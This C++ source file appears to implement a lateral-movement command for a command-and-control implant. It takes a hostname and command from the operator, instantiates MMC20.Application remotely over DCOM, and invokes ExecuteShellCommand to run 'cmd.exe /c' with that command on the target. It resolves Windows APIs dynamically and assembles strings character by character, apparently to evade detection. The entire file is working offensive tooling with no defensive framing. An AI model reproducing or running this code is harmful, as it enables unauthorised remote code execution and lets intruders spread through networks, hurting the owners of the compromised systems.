#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JUMP_DCOMEXEC

using namespace stardust;
using namespace starburst;

// MMC20.Application CLSID
static const GUID CLSID_MMC20 = { 0x49B2791A, 0xB1AE, 0x4C90, { 0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89 } };
static const GUID LOCAL_IID_IDispatch = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const GUID LOCAL_IID_NULL = { 0x00000000, 0x0000, 0x0000, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

typedef HRESULT (WINAPI *fnCoInitializeEx)( LPVOID, DWORD );
typedef void    (WINAPI *fnCoUninitialize)( void );
typedef HRESULT (WINAPI *fnCoCreateInstanceEx)( REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI* );
typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );

typedef BSTR (WINAPI *fnSysAllocString)( const OLECHAR* );
typedef void (WINAPI *fnSysFreeString)( BSTR );

// minimal IDispatch vtable
struct IDispatchVtbl_s {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)( void*, REFIID, void** );
    ULONG   (STDMETHODCALLTYPE *AddRef)( void* );
    ULONG   (STDMETHODCALLTYPE *Release)( void* );
    void*   GetTypeInfoCount;
    void*   GetTypeInfo;
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)( void*, REFIID, LPOLESTR*, UINT, LCID, DISPID* );
    HRESULT (STDMETHODCALLTYPE *Invoke)( void*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT* );
};
struct IDispatch_s { IDispatchVtbl_s* lpVtbl; };

auto declfn starburst::cmd_jump_dcomexec(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    if ( !host_str || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
        return;
    }

    uint32_t command_len = 0;
    auto command_str = parser_string( params, &command_len );
    if ( !command_str || command_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
        return;
    }

    HMODULE h_ole32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "ole32.dll" ) ) );
    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "oleaut32.dll" ) ) );

    if ( !h_ole32 || !h_oleaut32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
        return;
    }

    auto pCoInitializeEx = reinterpret_cast<fnCoInitializeEx>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeEx" ) ) ) );
    auto pCoUninitialize = reinterpret_cast<fnCoUninitialize>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoUninitialize" ) ) ) );
    auto pCoCreateInstanceEx = reinterpret_cast<fnCoCreateInstanceEx>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx" ) ) ) );
    auto pCoInitializeSecurity = reinterpret_cast<fnCoInitializeSecurity>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeSecurity" ) ) ) );
    auto pSysAllocString = reinterpret_cast<fnSysAllocString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysAllocString" ) ) ) );
    auto pSysFreeString = reinterpret_cast<fnSysFreeString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysFreeString" ) ) ) );

    if ( !pCoInitializeEx || !pCoCreateInstanceEx || !pSysAllocString || !pSysFreeString ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
        return;
    }

    HRESULT hr = pCoInitializeEx( nullptr, 0 );

    if ( pCoInitializeSecurity ) {
        pCoInitializeSecurity( nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
    }

    // build wide hostname
    wchar_t w_host[256] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );

    // COSERVERINFO for remote activation
    COSERVERINFO si = {};
    si.pwszName = w_host;

    MULTI_QI mqi = {};
    mqi.pIID = &LOCAL_IID_IDispatch;

    hr = pCoCreateInstanceEx( CLSID_MMC20, nullptr, 0x14, &si, 1, &mqi );
    if ( FAILED( hr ) || FAILED( mqi.hr ) || !mqi.pItf ) {
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CoCreateInstanceEx MMC20 failed - check DCOM perms" ) ) );
        return;
    }

    auto pApp = reinterpret_cast<IDispatch_s*>( mqi.pItf );

    // Get Document property (IDispatch)
    wchar_t doc_name[] = { 'D','o','c','u','m','e','n','t', 0 };
    LPOLESTR doc_names[] = { doc_name };
    DISPID doc_dispid;
    hr = pApp->lpVtbl->GetIDsOfNames( pApp, LOCAL_IID_NULL, doc_names, 1, LOCALE_SYSTEM_DEFAULT, &doc_dispid );
    if ( FAILED( hr ) ) {
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames Document failed" ) ) );
        return;
    }

    DISPPARAMS dp_empty = { nullptr, nullptr, 0, 0 };
    VARIANT vt_doc;
    vt_doc.vt = VT_EMPTY;
    hr = pApp->lpVtbl->Invoke( pApp, doc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_doc, nullptr, nullptr );
    if ( FAILED( hr ) || vt_doc.vt != VT_DISPATCH || !vt_doc.pdispVal ) {
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "Invoke Document failed" ) ) );
        return;
    }

    auto pDoc = reinterpret_cast<IDispatch_s*>( vt_doc.pdispVal );

    // Get ActiveView property
    wchar_t av_name[] = { 'A','c','t','i','v','e','V','i','e','w', 0 };
    LPOLESTR av_names[] = { av_name };
    DISPID av_dispid;
    hr = pDoc->lpVtbl->GetIDsOfNames( pDoc, LOCAL_IID_NULL, av_names, 1, LOCALE_SYSTEM_DEFAULT, &av_dispid );
    if ( FAILED( hr ) ) {
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames ActiveView failed" ) ) );
        return;
    }

    VARIANT vt_view;
    vt_view.vt = VT_EMPTY;
    hr = pDoc->lpVtbl->Invoke( pDoc, av_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_PROPERTYGET, &dp_empty, &vt_view, nullptr, nullptr );
    if ( FAILED( hr ) || vt_view.vt != VT_DISPATCH || !vt_view.pdispVal ) {
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "Invoke ActiveView failed" ) ) );
        return;
    }

    auto pView = reinterpret_cast<IDispatch_s*>( vt_view.pdispVal );

    // Call ExecuteShellCommand
    wchar_t esc_name[] = { 'E','x','e','c','u','t','e','S','h','e','l','l','C','o','m','m','a','n','d', 0 };
    LPOLESTR esc_names[] = { esc_name };
    DISPID esc_dispid;
    hr = pView->lpVtbl->GetIDsOfNames( pView, LOCAL_IID_NULL, esc_names, 1, LOCALE_SYSTEM_DEFAULT, &esc_dispid );
    if ( FAILED( hr ) ) {
        pView->lpVtbl->Release( pView );
        pDoc->lpVtbl->Release( pDoc );
        pApp->lpVtbl->Release( pApp );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIDsOfNames ExecuteShellCommand failed" ) ) );
        return;
    }

    // ExecuteShellCommand(Command, Directory, Parameters, WindowState)
    wchar_t w_cmd[256] = {};
    wchar_t cmd_exe[] = { 'c','m','d','.','e','x','e', 0 };
    for ( int i = 0; cmd_exe[i]; i++ ) w_cmd[i] = cmd_exe[i];

    wchar_t w_args[2048] = {};
    wchar_t args_prefix[] = { '/','c',' ', 0 };
    int aidx = 0;
    for ( ; args_prefix[aidx]; aidx++ ) w_args[aidx] = args_prefix[aidx];
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_args + aidx, 2048 - aidx - 1 );

    wchar_t w_empty[] = { 0 };

    // args in REVERSE order for IDispatch::Invoke
    VARIANT args[4];
    args[3].vt = VT_BSTR; args[3].bstrVal = pSysAllocString( w_cmd );      // Command
    args[2].vt = VT_BSTR; args[2].bstrVal = pSysAllocString( w_empty );     // Directory
    args[1].vt = VT_BSTR; args[1].bstrVal = pSysAllocString( w_args );      // Parameters
    args[0].vt = VT_BSTR; args[0].bstrVal = pSysAllocString( w_empty );     // WindowState "7" = minimized

    DISPPARAMS dp = { args, nullptr, 4, 0 };
    VARIANT vt_result;
    vt_result.vt = VT_EMPTY;

    hr = pView->lpVtbl->Invoke( pView, esc_dispid, LOCAL_IID_NULL, LOCALE_SYSTEM_DEFAULT,
        DISPATCH_METHOD, &dp, &vt_result, nullptr, nullptr );

    for ( int i = 0; i < 4; i++ ) pSysFreeString( args[i].bstrVal );

    pView->lpVtbl->Release( pView );
    pDoc->lpVtbl->Release( pDoc );
    pApp->lpVtbl->Release( pApp );
    pCoUninitialize();

    if ( SUCCEEDED( hr ) ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "command executed via DCOM MMC20.Application" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "DCOM ExecuteShellCommand failed" ) ) );
    }
}

#endif
